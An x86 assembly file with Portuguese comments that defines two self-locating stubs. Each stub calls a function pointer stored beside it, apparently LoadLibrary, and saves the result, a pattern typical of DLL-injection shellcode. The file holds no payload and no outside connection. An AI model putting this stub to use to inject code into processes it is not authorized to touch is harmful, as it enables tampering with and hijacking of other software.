.intel_syntax noprefix
	.text
	
	
	.globl	_Pload
	
_Pload:
	pushad
	pushfd
	call start
	
	start: 
		pop ecx
		sub ecx,7
	lea eax,[ecx+26] # não é mais 21, aumenta com o 2o lea!
	push ecx
	push eax
	call dword ptr [ecx-4] 	  
	 pop ecx	
     mov [ecx+26],eax   # salva o retorno da função lá (tem 4 bytes se for maior atropela esse stup, oq é de boa, após o return n importa mais)
	 popfd 
	 popad 
	 ret

	

	
	.globl	_Pload_stub

_Pload_stub:
	ret

	.globl	_Pload2
	
_Pload2:
	pushad
	pushfd
	call start2
	
	start2: 
		pop ecx
		sub ecx,7
	lea eax,[ecx+27] # não é mais 21, aumenta com o 2o lea!
	push ecx
	push eax
	call dword ptr [ecx-4] 	
     pop ebx # coloquei pra dar um fix, o loadll rola sem isso
	 pop ecx	
     mov [ecx+27],eax   # salva o retorno da função lá (tem 4 bytes se for maior atropela esse stup, oq é de boa, após o return n importa mais)
	 popfd 
	 popad 
	 ret

	

	
	.globl	_Pload_stub2

_Pload_stub2:
	ret
	